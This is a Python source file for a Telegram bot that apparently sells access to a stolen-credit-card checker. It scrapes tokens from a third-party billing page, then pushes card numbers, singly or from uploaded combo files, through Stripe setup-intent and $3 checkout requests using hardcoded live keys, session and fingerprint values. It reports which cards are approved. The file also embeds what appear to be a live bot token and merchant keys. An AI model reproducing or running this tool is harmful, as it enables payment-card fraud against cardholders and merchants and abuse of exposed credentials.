import os
import time
import json
import uuid
import re
import random
import hashlib
import requests
import threading
from datetime import datetime
import telebot
from telebot import types

# =============== CONFIG ===============
# يتم قراءة التوكن والأدمن من متغيرات البيئة تلقائياً أو استخدام القيمة الافتراضية
BOT_TOKEN = os.getenv("BOT_TOKEN", "8348644269:AAFqxVpdt0nVfFXh2SiL0EISiPULGmMfC9g")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8011795436"))
DEV = "@z_0_y2"
VERSION = "⤷ ᴠ𝟼.𝟶"
AUTHOR = "⤷ @z_0_y2"

# =============== البوابات ===============
GATEWAY_AUTH = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵"
GATEWAY_3D = "𝗦𝘁𝗿𝗶𝗽𝗲 $𝟯"

# =============== نظام حفظ البيانات (JSON Data Base) ===============
DATA_FILE = "bot_data.json"

def load_data():
    """تحميل بيانات الكودات والمستخدمين من الملف"""
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "user_codes": {},
        "pending_codes": {},
        "authorized_users": [1970257616]
    }

def save_data():
    """حفظ البيانات لمنع ضياعها عند إعادة تشغيل الاستضافة"""
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(db_data, f, ensure_ascii=False, indent=2)

db_data = load_data()
user_codes = db_data["user_codes"]
pending_codes = db_data["pending_codes"]
AUTHORIZED_USERS = db_data["authorized_users"]

# =============== إعدادات البوت ===============
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
stop_flags = {}

# =============== دوال نظام الكودات ===============
def is_authorized(user_id):
    """التحقق من صلاحية المستخدم"""
    user_str = str(user_id)
    if user_id in AUTHORIZED_USERS or user_id == ADMIN_ID:
        return True
    if user_str in user_codes:
        if user_codes[user_str]['expiry'] > time.time():
            return True
        else:
            del user_codes[user_str]
            save_data()
    return False

def generate_user_code(expiry_days):
    """إنشاء كود جديد وحفظه"""
    code = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]
    pending_codes[code] = {
        'expiry': time.time() + (expiry_days * 86400),
        'created_by': ADMIN_ID
    }
    save_data()
    return code

def activate_user_code(user_id, code):
    """تفعيل كود للمستخدم"""
    if code in pending_codes:
        data = pending_codes[code]
        user_codes[str(user_id)] = {
            'expiry': data['expiry']
        }
        del pending_codes[code]
        save_data()
        return True
    return False

def get_user_expiry(user_id):
    """الحصول على تاريخ انتهاء الصلاحية"""
    user_str = str(user_id)
    if user_str in user_codes:
        expiry = user_codes[user_str]['expiry']
        return datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    return "غير مسجل"

# =============== دوال مساعدة ===============
def mask_cc(cc):
    return f"{cc[:4]}******{cc[-4:]}"

def get_bin_info(bin_num):
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                'bank': d.get('bank', {}).get('name', 'Unknown'),
                'country': d.get('country', {}).get('name', 'Unknown'),
                'emoji': d.get('country', {}).get('emoji', '🌍'),
                'scheme': d.get('scheme', 'Unknown'),
                'type': d.get('type', 'Unknown'),
            }
    except Exception:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '🌍', 'scheme': 'Unknown', 'type': 'Unknown'}

# =============== 1. بوابة Stripe Auth ===============
STRIPE_AUTH_KEY = "pk_live_51NxTgeFZsEVAL3ZKnbjGrz8S0xO6fhPvT4bt4aeooxVpo5Scvr9sBQQ24ROaDcQGBavclQgqnrNPJOuqY4rlW5ji000xb2zNt3"

def create_setup_intent_auth():
    session = requests.Session()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    try:
        response = session.get('https://dashboard.proxywing.com/billing/account/paymentmethods/add', headers=headers, timeout=30)
        if response.status_code != 200:
            return None
        
        html = response.text
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', html)
        token = token_match.group(1) if token_match else None
        if not token:
            return None
        
        session_match = re.search(r'client_session_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        client_session_id = session_match.group(1) if session_match else str(uuid.uuid4())
        
        wallet_match = re.search(r'wallet_config_id["\']?\s*[:=]\s*["\']([a-f0-9-]+)["\']', html)
        wallet_config_id = wallet_match.group(1) if wallet_match else "2c10bacc-6fe0-42ea-a155-111bdb9d9751"
        
        stripe_mid = None
        stripe_sid = None
        for cookie in session.cookies:
            if cookie.name == '__stripe_mid':
                stripe_mid = cookie.value
            if cookie.name == '__stripe_sid':
                stripe_sid = cookie.value
        
        headers2 = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://dashboard.proxywing.com',
            'referer': 'https://dashboard.proxywing.com/billing/account/paymentmethods/add',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'token': token,
            'type': 'token_stripe',
            'description': '',
            'ccstart': '',
            'ccissuenum': '',
            'cardcvv': '',
            'bankaccttype': 'Checking',
            'bankacctholdername': '',
            'bankname': '',
            'bankroutingnum': '',
            'bankacctnum': '',
            'billingcontact': '0',
            'billing_name': '',
            'billing_address_1': '',
            'billing_address_2': '',
            'billing_city': '',
            'billing_state': '',
            'billing_postcode': '',
            'billing_country': ''
        }
        
        response2 = session.post('https://dashboard.proxywing.com/billing/index.php?rp=/stripe/setup/intent', 
                                  headers=headers2, 
                                  data=data,
                                  timeout=30)
        
        if response2.status_code == 200:
            result = response2.json()
            setup_intent_full = result.get('setup_intent')
            
            if setup_intent_full and '_secret_' in setup_intent_full:
                return {
                    'setup_intent_id': setup_intent_full.split('_secret')[0],
                    'client_secret': setup_intent_full,
                    'client_session_id': client_session_id,
                    'wallet_config_id': wallet_config_id,
                    'stripe_mid': stripe_mid or str(uuid.uuid4()),
                    'stripe_sid': stripe_sid or str(uuid.uuid4()),
                }
        return None
    except Exception:
        return None

def check_card_auth(card_line):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return "INVALID"
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        intent_data = create_setup_intent_auth()
        if not intent_data:
            return "ERROR"
        
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        data = f'payment_method_data[type]=card&payment_method_data[card][number]={formatted_cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm.zfill(2)}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538&payment_method_data[muid]={intent_data["stripe_mid"]}&payment_method_data[sid]={intent_data["stripe_sid"]}&payment_method_data[payment_user_agent]=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fdashboard.proxywing.com&payment_method_data[time_on_page]=34917&payment_method_data[client_attribution_metadata][client_session_id]={intent_data["client_session_id"]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]={intent_data["wallet_config_id"]}&expected_payment_method_type=card&use_stripe_sdk=true&key={STRIPE_AUTH_KEY}&client_attribution_metadata[client_session_id]={intent_data["client_session_id"]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]={intent_data["wallet_config_id"]}&client_secret={intent_data["client_secret"]}'
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        url = f"https://api.stripe.com/v1/setup_intents/{intent_data['setup_intent_id']}/confirm"
        response = requests.post(url, headers=headers, data=data, timeout=30)
        result = response.json()
        
        if response.status_code == 200 and result.get('status') == 'succeeded':
            return "APPROVED"
        else:
            return "DECLINED"
    except Exception:
        return "ERROR"

# =============== 2. بوابة Stripe $3 ===============
STRIPE_3D_KEY = "pk_live_51GjnvOEtynl19Eg2AOFRLLS54B2hzHZvHVgadRoeO1hZsMbvhZ54lzfRQsLVzXB7rvCeB1l7plSXA3mVqQJa1L1P008HUtbtyF"
CLIENT_SESSION_ID = "984353da-f765-4331-925e-640edb2caa11"
CHECKOUT_SESSION_ID = "cs_live_a1eI6jVt4AWmA84VofiO8deHZXFDRWOmUuVt6m22Z96nFd2sNpjsMcLYBF"
CHECKOUT_CONFIG_ID = "873ff754-640d-4ba1-8f89-0659fe6abdfc"
GUID = "9cf5bb6e-4c21-4b0b-8201-f1038da56c735b2538"
MUID = "b019ca67-8b30-40a0-907f-4a738930c6fcb03933"
SID = "9a7adf4e-f312-41e9-9461-51c6506cd9c1cef65c"
PASSIVE_CAPTCHA_TOKEN = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." # تم التخليص للاختصار

def check_card_3d(card_line):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return "INVALID"
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        formatted_cc = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        
        data = f'type=card&card[number]={formatted_cc}&card[cvc]={cvv}&card[exp_month]={mm.zfill(2)}&card[exp_year]={yy}&billing_details[name]=Devx+devx&billing_details[email]=devxtube4%40gmail.com&billing_details[address][country]=MA&guid={GUID}&muid={MUID}&sid={SID}&key={STRIPE_3D_KEY}&payment_user_agent=stripe.js%2F054be538d9%3B+stripe-js-v3%2F054be538d9%3B+checkout&client_attribution_metadata[client_session_id]={CLIENT_SESSION_ID}&client_attribution_metadata[checkout_session_id]={CHECKOUT_SESSION_ID}&client_attribution_metadata[merchant_integration_source]=checkout&client_attribution_metadata[merchant_integration_version]=embedded_checkout&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[checkout_config_id]={CHECKOUT_CONFIG_ID}'
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        pm_result = response.json()
        
        if 'id' not in pm_result:
            return "ERROR"
        
        pm_id = pm_result['id']
        data2 = f'eid=NA&payment_method={pm_id}&expected_amount=300&last_displayed_line_item_group_details[subtotal]=300&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&guid={GUID}&muid={MUID}&sid={SID}&key={STRIPE_3D_KEY}&version=054be538d9&init_checksum=IwpbSDQclSJWG0FBmoQzlLmm0ZJgJ7tS&js_checksum=qto~d%5En0%3DQU%3Eazbu%5D%5D%5EOYtl%60M%24qR+%7BYO%24Lduo%7B%5CQDc%5CyYU%5C%5Eo%3FU%5E%60w&px3=e5007c82d306938852ac834dd9385d553f5b935e4bf6de0911670a2935084fd6%3AEq2S52a0Sj06xwDYqkeKFJh3sP6ZLBwiM7jLgq0JA2dGxAQ7hDuYkZBnHQiueEuwe54rCK7uwqNfMJUNSSfr3w%3D%3D%3A1000%3AhEfb0kCXEtuHb2igYrWcyU%2F1t7cVy59j1aXrCqRuw1WDGLsJwtG0aYRoRg4eqkbzZIL%2Fl3xSWJXtJBTLDxJ2eSQCkVUUhyUohv5GT%2Fdt8XTrrVgckeBq8pj78tcs2AvfQx1wnIyaqY%2F8Ku3S5IqsCurLezI%2BVIoWj1GWwwJ0sFzme54tcJjR7cudnPtBT7xAsksJAK7yipyerSsgH2M7ep6glATR9iFlbM6OfOmFyns%2BRQBlWcx0iLeKv44GUvFxIJ8XuQkGDpNSDsgKHDCyEi3UROnXnO8oAa8D5QH%2BUj9n9KEigzuvUfvwSvrXCxhfTHUaUo3K8HMgigRiWYMpuK9PelfdJs0auC%2Fsn0YJGKVUU%2Foo%2BCS2lqDDqZBDscHklPkLplUZDQoVhEwE1qto3XVcn%2F9N6G0G077gLDOS6fcy0K%2Bez8AHsKNgyQfeWb52MYJ4QRAvSCo4H4RpuA%2FbYAv8UWluRmHnn9ZugqSwX3U3gRXVHDd7jgqU16On20jDyJnpbpPQI4I4MOPHGZIbMEL7bN01MUr9ugavx4QE7XAQpdLdkTuLFtlRLa8uEJPh&pxvid=83b160d9-3802-11f1-95dd-7e56af6e6f09&pxcts=83b1683b-3802-11f1-95de-f7a9bc34e8b1&passive_captcha_token={PASSIVE_CAPTCHA_TOKEN}&passive_captcha_ekey=&rv_timestamp=qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26CyY_L%24e%3DL%23Yu%3Cs%5BO%24sX%26n%3DYO%24y%5BbXD%5BOXC%5BRP%24eRXCeOLCdbP%23Y%26avetn%7BU%3Ee%26U%26CyXbQs%5BOP%3D%5B_T%3C%5B_%5C%3BX%26Yy%5BOMsYOUy%5BbL%3DeOYvYOnDX_QreR%5DudOTD%5BRQxeuayYu%60%3CYxMr%5BR%5DxXxd%3D%5B_%23%3E%5B_T%3CX%5Eo%3FU%5E%60w&client_attribution_metadata[client_session_id]={CLIENT_SESSION_ID}&client_attribution_metadata[checkout_session_id]={CHECKOUT_SESSION_ID}&client_attribution_metadata[merchant_integration_source]=checkout&client_attribution_metadata[merchant_integration_version]=embedded_checkout&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[checkout_config_id]={CHECKOUT_CONFIG_ID}'
        
        response2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{CHECKOUT_SESSION_ID}/confirm', headers=headers, data=data2, timeout=30)
        result = response2.json()
        
        if response2.status_code == 200 and result.get('payment_intent', {}).get('status') == 'succeeded':
            return "APPROVED"
        else:
            return "DECLINED"
    except Exception:
        return "ERROR"

# =============== أوامر البوت ===============
@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    if user_id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔐 إنشاء كود جديد", callback_data="create_code"),
            types.InlineKeyboardButton("📊 الكودات النشطة", callback_data="list_codes"),
            types.InlineKeyboardButton("👥 المستخدمين", callback_data="list_users")
        )
        welcome = f"""
◈ 𝗠𝗨𝗟𝗧𝗜 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ◈
◈ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 | 𝗦𝗧𝗥𝗜𝗣𝗘 $𝟯 ◈
━━━━━━━━━━━━━━━━━━━━━━
✧ {VERSION}
✧ {AUTHOR}
━━━━━━━━━━━━━━━━━━━━━━
✧ /start – ᴍᴇɴᴜ
✧ /chk ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ – ᴄʜᴇᴄᴋ ᴄᴀʀᴅ
✧ /stats – ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ
━━━━━━━━━━━━━━━━━━━━━━
✧ ꜱᴇɴᴅ ᴛxᴛ ꜰɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ᴍᴀꜱꜱ ᴄᴀʀᴅꜱ
"""
        bot.reply_to(message, welcome, reply_markup=markup, parse_mode='HTML')
    elif is_authorized(user_id):
        expiry = get_user_expiry(user_id)
        welcome = f"""
◈ 𝗠𝗨𝗟𝗧𝗜 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ◈
◈ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 | 𝗦𝗧𝗥𝗜𝗣𝗘 $𝟯 ◈
━━━━━━━━━━━━━━━━━━━━━━
✧ {VERSION}
✧ {AUTHOR}
━━━━━━━━━━━━━━━━━━━━━━
✧ /start – ᴍᴇɴᴜ
✧ /chk ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ – ᴄʜᴇᴄᴋ ᴄᴀʀᴅ
✧ /stats – ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ
━━━━━━━━━━━━━━━━━━━━━━
✧ صلاحيتك تنتهي: {expiry}
━━━━━━━━━━━━━━━━━━━━━━
✧ ꜱᴇɴᴅ ᴛxᴛ ꜰɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ᴍᴀꜱꜱ ᴄᴀʀᴅꜱ
"""
        bot.reply_to(message, welcome, parse_mode='HTML')
    else:
        bot.reply_to(message, f"❌ ACCESS DENIED\n✧ يرجى إدخال كود التفعيل\n✧ تواصل مع {DEV}", parse_mode='HTML')

@bot.message_handler(commands=["activate"])
def activate(message):
    user_id = message.chat.id
    code = message.text.replace('/activate ', '').strip()
    if activate_user_code(user_id, code):
        bot.reply_to(message, "✅ تم تفعيل الكود بنجاح!\nيمكنك الآن استخدام البوت", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ كود غير صالح أو منتهي الصلاحية!", parse_mode='HTML')

@bot.message_handler(commands=["gencode"])
def gen_code(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
        return
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /gencode <عدد الأيام>", parse_mode='HTML')
            return
        days = int(parts[1])
        if days <= 0:
            bot.reply_to(message, "❌ يجب أن يكون الرقم أكبر من 0", parse_mode='HTML')
            return
        code = generate_user_code(days)
        bot.reply_to(message, f"✅ <b>تم إنشاء الكود!</b>\n🔑 <code>{code}</code>\n📅 {days} يوم\nأرسل: <code>/activate {code}</code>", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح", parse_mode='HTML')

@bot.message_handler(commands=["stats"])
def stats(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED")
        return
    bot.reply_to(message, f"""
📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━
✧ ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: {len(user_codes) + len(AUTHORIZED_USERS)}
✧ ᴀᴄᴛɪᴠᴇ ᴄᴏᴅᴇꜱ: {len(pending_codes)}
━━━━━━━━━━━━━━━━━━━━━
✧ {VERSION}
""", parse_mode='HTML')

@bot.message_handler(commands=["chk"])
def check_single(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
        return
    
    # تشغيل الفحص في Thread لمنع التجميد
    threading.Thread(target=process_single_chk, args=(message,)).start()

def process_single_chk(message):
    user_id = message.chat.id
    try:
        card = message.text.replace('/chk ', '').strip()
        parts = card.split('|')
        if len(parts) < 4:
            bot.reply_to(message, "❌ صيغة غير صحيحة!\nاستخدم: <code>/chk CC|MM|YY|CVV</code>", parse_mode='HTML')
            return
        
        status_msg = bot.send_message(user_id, "⌛ جاري الفحص...", parse_mode='HTML')
        result_auth = check_card_auth(card)
        result_3d = check_card_3d(card)
        bin_info = get_bin_info(parts[0][:6])
        
        msg = f"""
◈ <b>MULTI GATEWAY RESULT</b> ◈
━━━━━━━━━━━━━━━━━━━━━
💳 <b>CC:</b> <code>{card}</code>
🔐 <b>{GATEWAY_AUTH}:</b> {result_auth}
💳 <b>{GATEWAY_3D}:</b> {result_3d}
━━━━━━━━━━━━━━━━━━━━━
🏦 {bin_info['bank']} | {bin_info['emoji']} {bin_info['country']}
⚡ {VERSION}
"""
        bot.edit_message_text(msg, user_id, status_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)[:100]}", parse_mode='HTML')

@bot.message_handler(content_types=["document"])
def handle_file(message):
    user_id = message.chat.id
    if not is_authorized(user_id):
        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
        return
    
    # تشغيل فحص الكومبو في Thread منفصل لتجنب انقطاع البوت
    threading.Thread(target=process_combo_file, args=(message,)).start()

def process_combo_file(message):
    user_id = message.chat.id
    stop_flags[user_id] = False
    status_msg = bot.send_message(user_id, "📂 جاري تحميل الملف...", parse_mode='HTML')
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)[:50]}", user_id, status_msg.message_id, parse_mode='HTML')
        return
    
    cards = [line.strip() for line in content.split('\n') if line.strip() and '|' in line]
    total = len(cards)
    
    if total == 0 or total > 500:
        bot.edit_message_text("❌ العدد غير مسموح (الحد الأقصى 500 بطاقة)", user_id, status_msg.message_id, parse_mode='HTML')
        return
    
    good_auth, good_3d = 0, 0
    valid_cards = []
    
    for i, card in enumerate(cards, 1):
        if stop_flags.get(user_id, False):
            bot.edit_message_text("⏹️ تم الإيقاف", user_id, status_msg.message_id, parse_mode='HTML')
            break
        
        result_auth = check_card_auth(card)
        result_3d = check_card_3d(card)
        
        if "APPROVED" in result_auth or "APPROVED" in result_3d:
            valid_cards.append(card)
            if "APPROVED" in result_auth: good_auth += 1
            if "APPROVED" in result_3d: good_3d += 1
            
            bin_info = get_bin_info(card.split('|')[0][:6])
            msg = f"✅ <b>VALID CARD!</b>\n💳 <code>{card}</code>\n🔐 AUTH: {result_auth}\n💳 $3: {result_3d}\n🏦 {bin_info['bank']}"
            bot.send_message(user_id, msg, parse_mode='HTML')
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("⏹️ إيقاف", callback_data='stop'))
        bot.edit_message_text(f"🔍 فحص: [{i}/{total}]\n✅ AUTH: {good_auth} | 💰 $3: {good_3d}", user_id, status_msg.message_id, reply_markup=markup, parse_mode='HTML')
        time.sleep(1.5)
    
    bot.send_message(user_id, f"✅ <b>اكتمال الفحص!</b>\n المقبولة: {len(valid_cards)}", parse_mode='HTML')

# =============== Callback Handlers ===============
@bot.callback_query_handler(func=lambda call: call.data == 'create_code')
def create_code_callback(call):
    if call.from_user.id != ADMIN_ID: return
    msg = bot.send_message(call.from_user.id, "📝 أرسل عدد أيام الصلاحية:")
    bot.register_next_step_handler(msg, get_code_days)

def get_code_days(message):
    try:
        days = int(message.text.strip())
        code = generate_user_code(days)
        bot.send_message(message.chat.id, f"✅ <b>الكود:</b> <code>{code}</code>\n📅 الأيام: {days}", parse_mode='HTML')
    except Exception:
        bot.send_message(message.chat.id, "❌ خطأ في إدخال الرقم")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    stop_flags[call.from_user.id] = True
    bot.answer_callback_query(call.id, "⏹️ جاري الإيقاف...")

# =============== تشغيل البوت ===============
if __name__ == "__main__":
    print("=" * 40)
    print("✅ BOT IS ACTIVE AND READY FOR HOSTING...")
    print("=" * 40)
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
